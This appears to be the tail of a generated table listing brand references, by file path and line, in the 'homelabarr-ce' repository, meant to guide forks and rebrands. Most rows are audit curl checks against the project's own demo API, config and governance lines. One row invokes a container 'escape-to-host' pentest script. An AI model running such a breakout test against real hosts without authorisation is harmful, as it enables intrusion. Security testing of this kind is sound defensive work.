| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 842 | `R=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 849 | `curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 858 | `JWT=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 862 | `R=$(curl -fsS -H "Authorization: Bearer $JWT" https://ce-demo.homelabarr.com/api/_routes)` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 874 | `    "https://ce-demo.homelabarr.com/api/containers$P")` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 886 | `    "https://ce-demo.homelabarr.com/api/applications/$P")` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 897 | `PRE=$(curl -fsS -H "Authorization: Bearer $JWT" 'https://ce-demo.homelabarr.com/api/audit?limit=1' \| jq -r '.chain.ok')` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 908 | `    https://ce-demo.homelabarr.com/api/audit?limit=1 \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 912 | `POST=$(curl -fsS -H "Authorization: Bearer $JWT" 'https://ce-demo.homelabarr.com/api/audit?limit=1' \| jq -r '.chain.ok'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 920 | `H=$(curl -sI https://ce-demo.homelabarr.com/api/applications)` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 932 | `curl -fsS https://ce-demo.homelabarr.com/api/health \| jq -e 'keys\|sort == ["ok","state","ts"]' > /dev/null && echo 'OK` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 935 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/health/detail)" = 401 \|\| { echo FA` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 938 | `curl -fsS -H "Authorization: Bearer $JWT" https://ce-demo.homelabarr.com/api/audit?limit=50 \| jq -e '[.events[].event] ` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 941 | `# (run on host) aa-status \| grep homelabarr-backend \| grep enforce` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1020 | `  - homelabarr-ce-security-audit-round-8.md (prior, committed in security/round-8-deployment-runbook)` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1035 | `1. I'll re-verify with '?_v=r9verify' cache-bust against 'ce-demo.homelabarr.com'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1046 | `*Generated 2026-05-22T19:18:31.547Z — source: passive recon of 'ce-demo.homelabarr.com' + read-only review of 'securit` |
| `docs/decisions/0001-password-hash.md` | 5 | `**Decision maker:** smashingtags` |
| `docs/dr-drill.sh` | 13 | `  echo "Usage: $0 <path/to/homelabarr.STAMP.db> <path/to/secrets.STAMP.tar.zst>"` |
| `docs/dr-drill.sh` | 26 | `docker cp "$BACKUP_DB" homelabarr-backend:/app/data/homelabarr.db` |
| `docs/fail2ban/homelabarr-jail.conf` | 1 | `[homelabarr]` |
| `docs/fail2ban/homelabarr-jail.conf` | 3 | `filter   = homelabarr` |
| `docs/fail2ban/homelabarr-jail.conf` | 5 | `logpath  = /var/lib/docker/volumes/*homelabarr-activity*/_data/audit-*.jsonl` |
| `docs/fail2ban/homelabarr-jail.conf` | 6 | `           /var/lib/docker/volumes/*homelabarr-activity*/_data/audit.jsonl` |
| `docs/governance/github-security-settings.md` | 3 | `These settings must be enabled at 'Settings → Code security and analysis' for the 'smashingtags/homelabarr-ce' reposit` |
| `docs/governance/github-security-settings.md` | 27 | `gh api repos/smashingtags/homelabarr-ce --jq '.security_and_analysis'` |
| `docs/governance/github-security-settings.md` | 28 | `gh api repos/smashingtags/homelabarr-ce/private-vulnerability-reporting` |
| `docs/internal/OWNER-PUNCHLIST.md` | 1 | `# Owner Punch-List — homelabarr-ce` |
| `docs/ir/02-on-call-and-contacts.md` | 5 | `Single operator: @smashingtags. No formal rotation.` |
| `docs/ir/02-on-call-and-contacts.md` | 14 | `\| GitHub \| @smashingtags \| Image / repo intervention \|` |
| `docs/ir/06-tabletop-exercises.md` | 30 | `> You notice a new tag for 'homelabarr-backend' on GHCR that you didn't push.` |
| `docs/ir/playbooks/PB-11-security-update-past-sla.md` | 34 | `1. Confirm new image is running on ce-demo: 'docker inspect homelabarr-demo-backend --format '{{.Config.Image}}''` |
| `docs/observability-log-shipping.md` | 21 | `      - homelabarr-activity:/audit:ro` |
| `docs/observability-log-shipping.md` | 23 | `      - homelabarr-internal` |
| `docs/threat-model/02-trust-boundaries.md` | 7 | `3. **nginx → backend container** — HTTP over Docker bridge network. Auth: none (network isolation is the boundary). ` |
| `docs/topology.md` | 5 | `All containers on one Docker host behind Traefik. The 'homelabarr-internal' bridge network is the trust boundary.` |
| `docs/topology.md` | 32 | `1. Generate a CA: 'step ca init --name homelabarr-ca'` |
| `pentest/README.md` | 8 | `export ART_TARGET=https://ce-demo.homelabarr.com` |
| `pentest/README.md` | 51 | `docker exec homelabarr-backend sh -c 'cd /app && bash pentest/atomics/T1611-escape-to-host/test.sh'` |
| `pentest/atomics/audit-continuity/09-audit-log-continuity.sh` | 4 | `BASE="${ART_TARGET:-https://ce-demo.homelabarr.com}"` |
| `pentest/harness/env.example` | 1 | `ART_TARGET=https://ce-demo.homelabarr.com` |
| `pentest/harness/run.sh` | 3 | `# Usage: ART_TARGET=https://ce-demo.homelabarr.com ./run.sh [--class A1\|A2\|A3\|A4\|A5]` |
| `playwright.config.ts` | 14 | `const SMOKE_URL = process.env.TEST_BASE_URL \|\| 'https://ce-dev.homelabarr.com';` |
| `public/.well-known/security.txt` | 2 | `Contact: https://github.com/imogenlabs/homelabarr-ce/security/advisories/new` |
| `public/.well-known/security.txt` | 5 | `Canonical: https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `public/.well-known/security.txt` | 6 | `Policy: https://github.com/imogenlabs/homelabarr-ce/blob/main/SECURITY.md` |
| `public/humans.txt` | 2 | `Maintainer: Michael Ashley -- smashingtags` |
| `public/humans.txt` | 3 | `Site: https://homelabarr.com` |
| `public/sitemap.xml` | 4 | `    <loc>https://ce-demo.homelabarr.com/</loc>` |
| `tests/README.md` | 16 | `TEST_BASE_URL=https://ce-dev.homelabarr.com npx playwright test` |
| `tests/README.md` | 19 | `TEST_BASE_URL=https://ce-staging.homelabarr.com npx playwright test` |
| `tests/e2e/README.md` | 50 | `TEST_BASE_URL=https://ce-dev.homelabarr.com npx playwright test --project=smoke` |
| `traefik/installer/ubuntu.sh` | 40 | `   source="/opt/homelabarr/traefik/templates/"` |
| `traefik/installer/ubuntu.sh` | 41 | `   envmigrate="/opt/homelabarr/apps/.subactions/envmigrate.sh"` |
| `traefik/installer/ubuntu.sh` | 359 | `   envmigrate="/opt/homelabarr/apps/.subactions/envmigrate.sh"` |
| `traefik/templates/compose/docker-compose.yml` | 90 | `    image: 'smashingtags/cf-companion:latest'` |

---

## How to use this

Every row is a place a fork/rebrand would need to inspect. Most can be handled by the
`sed` recipes in the [White-Label & Forking guide](white-label.md#the-5-minute-starter);
the rest are one-off edits (meta tags, scripts, URLs).

If you find a brand reference in your fork that isn't listed here, either your fork
has diverged from upstream or this audit is lagging — check the workflow run on the
last commit to `main`.
